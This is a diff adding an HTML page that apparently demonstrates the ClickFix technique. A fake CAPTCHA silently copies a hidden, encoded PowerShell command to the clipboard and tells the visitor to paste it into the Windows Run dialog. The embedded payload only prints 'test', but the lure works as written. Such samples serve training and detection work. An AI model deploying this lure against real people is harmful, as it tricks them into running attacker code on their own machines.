@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<!-- ClickFix (MITRE T1204.004): fake CAPTCHA copies a hidden, obfuscated PowerShell command and tells the user to run it via Win+R.
+     The payload below is inert (it base64-encodes "Write-Output test"). -->
+<html lang="en"><head><meta charset="utf-8"><title>Verify you are human</title></head>
+<body style="font-family:Arial;text-align:center;padding-top:80px">
+<h2>Verify you are human</h2>
+<button id="verify">I'm not a robot</button>
+<div id="steps" hidden>
+  <p>Verification steps:</p>
+  <ol style="display:inline-block;text-align:left">
+    <li>Press Windows Key + R</li><li>Press Ctrl + V</li><li>Press Enter</li>
+  </ol>
+</div>
+<script>
+  const payload = 'powershell -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB0AGUAcwB0AA== # verification ID 4821';
+  document.getElementById('verify').addEventListener('click', async () => {
+    try { await navigator.clipboard.writeText(payload); } catch (e) {}
+    document.getElementById('steps').hidden = false;
+  });
+</script></body></html>
